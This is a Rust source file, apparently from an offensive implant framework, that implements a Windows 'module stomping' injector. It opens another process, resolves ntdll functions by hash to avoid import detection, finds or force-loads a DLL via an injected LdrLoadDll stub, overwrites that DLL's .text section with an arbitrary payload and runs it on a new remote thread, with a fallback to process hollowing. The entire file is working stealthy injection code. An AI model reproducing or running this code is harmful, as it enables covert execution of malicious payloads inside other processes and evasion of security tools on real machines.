use crate::injection::Injector;
use anyhow::{anyhow, Result};

pub struct ModuleStompInjector;

#[cfg(windows)]
impl Injector for ModuleStompInjector {
    fn inject(&self, pid: u32, payload: &[u8]) -> Result<()> {
        use std::mem::size_of;
        use winapi::um::memoryapi::{
            ReadProcessMemory, VirtualAllocEx, VirtualProtectEx, WriteProcessMemory,
        };
        use winapi::um::processthreadsapi::OpenProcess;
        use winapi::um::winnt::{
            IMAGE_DOS_HEADER, IMAGE_NT_HEADERS32, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER,
        };
        use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE};
        use winapi::um::winnt::{
            PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION,
            PROCESS_VM_READ, PROCESS_VM_WRITE,
        };

        let is_pe = payload.len() >= 2 && payload[0] == b'M' && payload[1] == b'Z';
        if is_pe {
            log::info!(
                "PE payload detected, forwarding to process hollowing's inject_into_process"
            );
            return match hollowing::windows_impl::inject_into_process(pid, payload) {
                Ok(_) => Ok(()),
                Err(e) => Err(anyhow!("process hollowing PE injection failed: {}", e)),
            };
        }

        // The shellcode stub built below is x86_64 machine code.  Reject the
        // call at runtime on any other architecture to prevent the CPU from
        // executing garbage bytes (L-05 fix).
        #[cfg(not(target_arch = "x86_64"))]
        return Err(anyhow!(
            "ModuleStompInjector: shellcode stub requires x86_64; unsupported architecture"
        ));

        unsafe {
            let h_proc = OpenProcess(
                PROCESS_VM_OPERATION
                    | PROCESS_VM_WRITE
                    | PROCESS_VM_READ
                    | PROCESS_CREATE_THREAD
                    | PROCESS_QUERY_INFORMATION,
                0,
                pid,
            );
            if h_proc.is_null() {
                return Err(anyhow!("Failed to open process"));
            }

            // ── Resolve ntdll, LdrLoadDll, NtCreateThreadEx, NtQueryInformationProcess ──
            let ntdll_hash: u32 = pe_resolve::hash_str(b"ntdll.dll\0");
            let ntdll = pe_resolve::get_module_handle_by_hash(ntdll_hash)
                .ok_or_else(|| anyhow!("ntdll not found via PEB walk"))?;

            let ldr_load_dll_hash = pe_resolve::hash_str(b"LdrLoadDll\0");
            let ldr_load_dll_ptr = pe_resolve::get_proc_address_by_hash(ntdll, ldr_load_dll_hash)
                .ok_or_else(|| anyhow!("LdrLoadDll not found"))?;

            let ntcreate_hash = pe_resolve::hash_str(b"NtCreateThreadEx\0");
            let ntcreate_ptr = pe_resolve::get_proc_address_by_hash(ntdll, ntcreate_hash)
                .ok_or_else(|| anyhow!("NtCreateThreadEx not found"))?;

            type NtCreateThreadExFn = unsafe extern "system" fn(
                *mut *mut winapi::ctypes::c_void,
                u32,
                *mut winapi::ctypes::c_void,
                *mut winapi::ctypes::c_void,
                *mut winapi::ctypes::c_void,
                *mut winapi::ctypes::c_void,
                u32,
                usize,
                usize,
                usize,
                *mut winapi::ctypes::c_void,
            ) -> i32;
            let build_thread: NtCreateThreadExFn = std::mem::transmute(ntcreate_ptr);

            type NtQueryInfoProcess = unsafe extern "system" fn(
                winapi::shared::ntdef::HANDLE,
                u32,
                *mut winapi::ctypes::c_void,
                u32,
                *mut u32,
            ) -> i32;
            let ntqip_hash = pe_resolve::hash_str(b"NtQueryInformationProcess\0");
            let ntqip_ptr = pe_resolve::get_proc_address_by_hash(ntdll, ntqip_hash)
                .ok_or_else(|| anyhow!("NtQueryInformationProcess not found"))?;
            let ntqip: NtQueryInfoProcess = std::mem::transmute(ntqip_ptr);

            // ── Get target process PEB address ──────────────────────────────
            let mut pbi = [0u8; 48];
            let mut ret_len = 0u32;
            ntqip(h_proc, 0, pbi.as_mut_ptr() as _, 48, &mut ret_len);
            let peb_addr = u64::from_le_bytes(pbi[8..16].try_into().unwrap()) as usize;
            if peb_addr == 0 {
                pe_resolve::close_handle(h_proc);
                return Err(anyhow!("Failed to get target PEB address"));
            }

            // ── Walk TARGET process PEB to find a suitable already-loaded DLL ──
            // H-19 fix: previously this walked the LOCAL process PEB via gs:[0x30]
            // which had no relationship to the modules loaded in the remote target.
            let mut ldr_ptr = 0usize;
            let mut bytes_read = 0usize;
            ReadProcessMemory(
                h_proc,
                (peb_addr + 0x18) as _,
                &mut ldr_ptr as *mut _ as _,
                8,
                &mut bytes_read,
            );
            if ldr_ptr == 0 {
                pe_resolve::close_handle(h_proc);
                return Err(anyhow!("Failed to read target Ldr pointer"));
            }

            let list_head = ldr_ptr + 0x10; // InLoadOrderModuleList
            let mut flink = 0usize;
            ReadProcessMemory(
                h_proc,
                list_head as _,
                &mut flink as *mut _ as _,
                8,
                &mut bytes_read,
            );

            let mut target_dll_name: Option<String> = None;
            let mut target_base: usize = 0;
            let mut current = flink;

            while current != list_head && current != 0 {
                let mut entry = [0u8; 0x70];
                if ReadProcessMemory(
                    h_proc,
                    current as _,
                    entry.as_mut_ptr() as _,
                    entry.len(),
                    &mut bytes_read,
                ) == 0
                {
                    break;
                }
                let dll_base = u64::from_le_bytes(entry[0x30..0x38].try_into().unwrap()) as usize;
                let name_len = u16::from_le_bytes(entry[0x48..0x4A].try_into().unwrap()) as usize;
                let name_buf = u64::from_le_bytes(entry[0x50..0x58].try_into().unwrap()) as usize;

                if dll_base != 0 && name_len > 0 && name_buf != 0 {
                    let mut name_wide = vec![0u16; name_len / 2];
                    ReadProcessMemory(
                        h_proc,
                        name_buf as _,
                        name_wide.as_mut_ptr() as _,
                        name_len,
                        &mut bytes_read,
                    );
                    let name_str = String::from_utf16_lossy(&name_wide);
                    let lname = name_str.to_ascii_lowercase();

                    let is_excluded = lname.starts_with("ntdll")
                        || lname.starts_with("kernel32")
                        || lname.starts_with("kernelbase")
                        || lname.starts_with("agent")
                        || lname.len() < 5;

                    if !is_excluded {
                        // Read PE headers from TARGET process to check .text size.
                        let mut dos_header: IMAGE_DOS_HEADER = std::mem::zeroed();
                        ReadProcessMemory(
                            h_proc,
                            dll_base as _,
                            &mut dos_header as *mut _ as _,
                            size_of::<IMAGE_DOS_HEADER>(),
                            &mut bytes_read,
                        );
                        if dos_header.e_magic == winapi::um::winnt::IMAGE_DOS_SIGNATURE {
                            let nt_addr = dll_base + dos_header.e_lfanew as usize;
                            let mut nt_headers: IMAGE_NT_HEADERS64 = std::mem::zeroed();
                            ReadProcessMemory(
                                h_proc,
                                nt_addr as _,
                                &mut nt_headers as *mut _ as _,
                                size_of::<IMAGE_NT_HEADERS64>(),
                                &mut bytes_read,
                            );
                            let ns = nt_headers.FileHeader.NumberOfSections as usize;
                            let sec_base = nt_addr
                                + std::mem::offset_of!(IMAGE_NT_HEADERS64, OptionalHeader)
                                + nt_headers.FileHeader.SizeOfOptionalHeader as usize;
                            for i in 0..ns {
                                let mut sec: IMAGE_SECTION_HEADER = std::mem::zeroed();
                                ReadProcessMemory(
                                    h_proc,
                                    (sec_base + i * size_of::<IMAGE_SECTION_HEADER>()) as _,
                                    &mut sec as *mut _ as _,
                                    size_of::<IMAGE_SECTION_HEADER>(),
                                    &mut bytes_read,
                                );
                                if &sec.Name[..5] == b".text" {
                                    if *sec.Misc.VirtualSize() as usize >= payload.len() {
                                        target_dll_name = Some(name_str);
                                        target_base = dll_base;
                                    }
                                    break;
                                }
                            }
                        }
                    }
                }

                if target_dll_name.is_some() {
                    break;
                }
                let next_flink = u64::from_le_bytes(entry[0..8].try_into().unwrap()) as usize;
                if next_flink == current {
                    break;
                }
                current = next_flink;
            }

            // ── If no suitable DLL found, load one via LdrLoadDll ──────────
            if target_base == 0 {
                // Hardcoded candidate list: DLLs commonly available on Windows
                // with large .text sections that are safe to stomp.
                let candidates = [
                    "msfte.dll",
                    "mshtml.dll",
                    "msxml3.dll",
                    "iertutil.dll",
                    "clrjit.dll",
                ];
                let mut loaded_ok = false;

                for &candidate in &candidates {
                    let wide: Vec<u16> = candidate
                        .encode_utf16()
                        .chain(std::iter::once(0))
                        .collect();
                    let wide_bytes = wide.len() * 2;
                    let us_offset = wide_bytes;
                    let base_addr_offset = us_offset + 16;
                    let total_remote = base_addr_offset + 8;

                    let remote_buf = VirtualAllocEx(
                        h_proc,
                        std::ptr::null_mut(),
                        total_remote,
                        MEM_COMMIT | MEM_RESERVE,
                        PAGE_READWRITE,
                    );
                    if remote_buf.is_null() {
                        continue;
                    }

                    let mut written = 0usize;
                    if WriteProcessMemory(
                        h_proc,
                        remote_buf,
                        wide.as_ptr() as _,
                        wide_bytes,
                        &mut written,
                    ) == 0
                    {
                        winapi::um::memoryapi::VirtualFreeEx(
                            h_proc,
                            remote_buf,
                            0,
                            winapi::um::winnt::MEM_RELEASE,
                        );
                        continue;
                    }

                    let remote_us_ptr =
                        (remote_buf as usize + us_offset) as *mut winapi::ctypes::c_void;
                    let remote_str_va = remote_buf as usize;
                    let mut us_bytes = [0u8; 16];
                    us_bytes[0..2]
                        .copy_from_slice(&((wide_bytes - 2) as u16).to_le_bytes());
                    us_bytes[2..4].copy_from_slice(&(wide_bytes as u16).to_le_bytes());
                    us_bytes[8..16]
                        .copy_from_slice(&(remote_str_va as u64).to_le_bytes());
                    if WriteProcessMemory(
                        h_proc,
                        remote_us_ptr,
                        us_bytes.as_ptr() as _,
                        16,
                        &mut written,
                    ) == 0
                    {
                        winapi::um::memoryapi::VirtualFreeEx(
                            h_proc,
                            remote_buf,
                            0,
                            winapi::um::winnt::MEM_RELEASE,
                        );
                        continue;
                    }

                    // Build x64 stub for LdrLoadDll
                    let stub_region = VirtualAllocEx(
                        h_proc,
                        std::ptr::null_mut(),
                        256,
                        MEM_COMMIT | MEM_RESERVE,
                        PAGE_READWRITE,
                    );
                    if stub_region.is_null() {
                        winapi::um::memoryapi::VirtualFreeEx(
                            h_proc,
                            remote_buf,
                            0,
                            winapi::um::winnt::MEM_RELEASE,
                        );
                        continue;
                    }

                    let ldr_addr = ldr_load_dll_ptr as u64;
                    let us_va = remote_buf as u64;
                    let us_struct_va = us_va + us_offset as u64;
                    let base_out_va = us_va + base_addr_offset as u64;

                    let mut stub = Vec::<u8>::with_capacity(64);
                    stub.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]); // sub rsp, 0x28
                    stub.extend_from_slice(&[0x33, 0xC9]); // xor ecx, ecx
                    stub.extend_from_slice(&[0x33, 0xD2]); // xor edx, edx
                    stub.extend_from_slice(&[0x49, 0xB8]); // mov r8, <us_struct_va>
                    stub.extend_from_slice(&us_struct_va.to_le_bytes());
                    stub.extend_from_slice(&[0x49, 0xB9]); // mov r9, <base_out_va>
                    stub.extend_from_slice(&base_out_va.to_le_bytes());
                    stub.extend_from_slice(&[0x48, 0xB8]); // mov rax, <ldr_addr>
                    stub.extend_from_slice(&ldr_addr.to_le_bytes());
                    stub.extend_from_slice(&[0xFF, 0xD0]); // call rax
                    stub.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]); // add rsp, 0x28
                    stub.push(0xC3); // ret

                    if WriteProcessMemory(
                        h_proc,
                        stub_region,
                        stub.as_ptr() as _,
                        stub.len(),
                        &mut written,
                    ) == 0
                    {
                        winapi::um::memoryapi::VirtualFreeEx(
                            h_proc,
                            stub_region,
                            0,
                            winapi::um::winnt::MEM_RELEASE,
                        );
                        winapi::um::memoryapi::VirtualFreeEx(
                            h_proc,
                            remote_buf,
                            0,
                            winapi::um::winnt::MEM_RELEASE,
                        );
                        continue;
                    }

                    let mut _old_prot = 0u32;
                    winapi::um::memoryapi::VirtualProtectEx(
                        h_proc,
                        stub_region,
                        stub.len(),
                        winapi::um::winnt::PAGE_EXECUTE_READ,
                        &mut _old_prot,
                    );

                    let mut h_thread: *mut winapi::ctypes::c_void = std::ptr::null_mut();
                    let status = build_thread(
                        &mut h_thread,
                        0x1FFFFF,
                        std::ptr::null_mut(),
                        h_proc,
                        stub_region,
                        std::ptr::null_mut(),
                        0,
                        0,
                        0,
                        0,
                        std::ptr::null_mut(),
                    );
                    if status >= 0 && !h_thread.is_null() {
                        winapi::um::synchapi::WaitForSingleObject(
                            h_thread,
                            winapi::um::winbase::INFINITE,
                        );
                        pe_resolve::close_handle(h_thread);
                    }
                    winapi::um::memoryapi::VirtualFreeEx(
                        h_proc,
                        stub_region,
                        0,
                        winapi::um::winnt::MEM_RELEASE,
                    );
                    winapi::um::memoryapi::VirtualFreeEx(
                        h_proc,
                        remote_buf,
                        0,
                        winapi::um::winnt::MEM_RELEASE,
                    );

                    // Re-walk target PEB to find the newly loaded DLL.
                    let mut flink2 = 0usize;
                    ReadProcessMemory(
                        h_proc,
                        list_head as _,
                        &mut flink2 as *mut _ as _,
                        8,
                        &mut bytes_read,
                    );
                    let mut cur2 = flink2;
                    while cur2 != list_head && cur2 != 0 {
                        let mut ent = [0u8; 0x70];
                        if ReadProcessMemory(
                            h_proc,
                            cur2 as _,
                            ent.as_mut_ptr() as _,
                            ent.len(),
                            &mut bytes_read,
                        ) == 0
                        {
                            break;
                        }
                        let db =
                            u64::from_le_bytes(ent[0x30..0x38].try_into().unwrap()) as usize;
                        let nl =
                            u16::from_le_bytes(ent[0x48..0x4A].try_into().unwrap()) as usize;
                        let nb =
                            u64::from_le_bytes(ent[0x50..0x58].try_into().unwrap()) as usize;
                        if db != 0 && nl > 0 && nb != 0 {
                            let mut nw = vec![0u16; nl / 2];
                            ReadProcessMemory(
                                h_proc,
                                nb as _,
                                nw.as_mut_ptr() as _,
                                nl,
                                &mut bytes_read,
                            );
                            let ns = String::from_utf16_lossy(&nw).to_lowercase();
                            if ns.contains(&candidate.to_lowercase()) {
                                target_dll_name = Some(candidate.to_string());
                                target_base = db;
                                loaded_ok = true;
                                break;
                            }
                        }
                        let nxt =
                            u64::from_le_bytes(ent[0..8].try_into().unwrap()) as usize;
                        if nxt == cur2 {
                            break;
                        }
                        cur2 = nxt;
                    }
                    if loaded_ok {
                        break;
                    }
                }

                if target_base == 0 {
                    pe_resolve::close_handle(h_proc);
                    return Err(anyhow!(
                        "ModuleStompInjector: no loaded module with a .text section large enough to accommodate the payload ({} bytes)",
                        payload.len()
                    ));
                }
            }

            let _ = target_dll_name; // unused after selection; kept for diagnostics

            // ── Find .text section of target DLL ─────────────────────────────
            let mut dos_header: IMAGE_DOS_HEADER = std::mem::zeroed();
            ReadProcessMemory(
                h_proc,
                target_base as _,
                &mut dos_header as *mut _ as _,
                size_of::<IMAGE_DOS_HEADER>(),
                &mut bytes_read,
            );
            if dos_header.e_magic != winapi::um::winnt::IMAGE_DOS_SIGNATURE {
                pe_resolve::close_handle(h_proc);
                return Err(anyhow!("Invalid DOS signature on target DLL"));
            }

            #[cfg(target_arch = "x86_64")]
            type NtHeaders = IMAGE_NT_HEADERS64;
            #[cfg(target_arch = "x86")]
            type NtHeaders = IMAGE_NT_HEADERS32;

            let mut nt_headers: NtHeaders = std::mem::zeroed();
            let nt_addr = target_base + dos_header.e_lfanew as usize;
            ReadProcessMemory(
                h_proc,
                nt_addr as _,
                &mut nt_headers as *mut _ as _,
                size_of::<NtHeaders>(),
                &mut bytes_read,
            );

            let section_base = nt_addr
                + std::mem::offset_of!(NtHeaders, OptionalHeader)
                + nt_headers.FileHeader.SizeOfOptionalHeader as usize;
            let mut text_rva = 0u32;
            let mut text_size = 0u32;

            for i in 0..nt_headers.FileHeader.NumberOfSections as usize {
                let mut sec: IMAGE_SECTION_HEADER = std::mem::zeroed();
                ReadProcessMemory(
                    h_proc,
                    (section_base + i * size_of::<IMAGE_SECTION_HEADER>()) as _,
                    &mut sec as *mut _ as _,
                    size_of::<IMAGE_SECTION_HEADER>(),
                    &mut bytes_read,
                );
                if &sec.Name[..5] == b".text" {
                    text_rva = sec.VirtualAddress;
                    text_size = *sec.Misc.VirtualSize();
                    break;
                }
            }

            if text_rva == 0 {
                pe_resolve::close_handle(h_proc);
                return Err(anyhow!("Failed to find .text section of target DLL"));
            }
            if payload.len() > text_size as usize {
                pe_resolve::close_handle(h_proc);
                return Err(anyhow!("Payload larger than target .text section"));
            }

            // ── Stomp .text section and execute ────────────────────────────
            let target_addr = (target_base + text_rva as usize) as *mut winapi::ctypes::c_void;
            let mut old_protect = 0u32;
            let mut written = 0usize;
            VirtualProtectEx(
                h_proc,
                target_addr,
                payload.len(),
                PAGE_READWRITE,
                &mut old_protect,
            );
            WriteProcessMemory(
                h_proc,
                target_addr,
                payload.as_ptr() as _,
                payload.len(),
                &mut written,
            );
            VirtualProtectEx(
                h_proc,
                target_addr,
                payload.len(),
                PAGE_EXECUTE_READ,
                &mut old_protect,
            );
            winapi::um::processthreadsapi::FlushInstructionCache(
                h_proc,
                target_addr,
                payload.len(),
            );

            let mut h_exec_thread: *mut winapi::ctypes::c_void = std::ptr::null_mut();
            let exec_status = build_thread(
                &mut h_exec_thread,
                0x1FFFFF,
                std::ptr::null_mut(),
                h_proc,
                target_addr,
                std::ptr::null_mut(),
                0,
                0,
                0,
                0,
                std::ptr::null_mut(),
            );
            if exec_status >= 0 && !h_exec_thread.is_null() {
                pe_resolve::close_handle(h_exec_thread);
            } else {
                pe_resolve::close_handle(h_proc);
                return Err(anyhow!(
                    "NtCreateThreadEx execution failed: {:x}",
                    exec_status
                ));
            }

            pe_resolve::close_handle(h_proc);
        }
        Ok(())
    }
}

#[cfg(not(windows))]
impl Injector for ModuleStompInjector {
    fn inject(&self, _pid: u32, _payload: &[u8]) -> Result<()> {
        Err(anyhow!("Module Stomping only supported on Windows"))
    }
}
